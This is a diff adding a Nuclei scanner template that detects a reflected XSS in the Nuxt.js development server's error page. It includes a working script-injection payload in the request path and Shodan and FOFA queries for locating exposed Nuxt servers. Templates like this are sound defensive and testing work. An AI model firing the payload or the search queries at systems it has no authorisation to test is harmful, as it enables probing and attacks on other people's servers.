@@ -1,0 +1,37 @@
+id: nuxt-js-xss
+
+info:
+  name: Error Page XSS - Nuxt.js
+  author: DhiyaneshDK
+  severity: medium
+  description: |
+    The developer server unsafely renders the stack trace within errors. This can be manipulated by sending a specially crafted request.
+  reference:
+    - https://huntr.dev/bounties/70ac720d-c932-4ed3-98b1-dd2cbcb90185/
+    - https://bryces.io/blog/nuxt3
+    - https://twitter.com/fofabot/status/1669339995780558849
+  metadata:
+    max-request: 1
+    shodan-query: html:"buildAssetsDir" "nuxt"
+    fofa-query: body="buildAssetsDir" && body="__nuxt"
+    verified: "true"
+  tags: xss,nuxtjs,error
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/__nuxt_error?stack=%0A<script>alert(document.domain)</script>"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(document.domain)</script>"
+          - "window.__NUXT__"
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
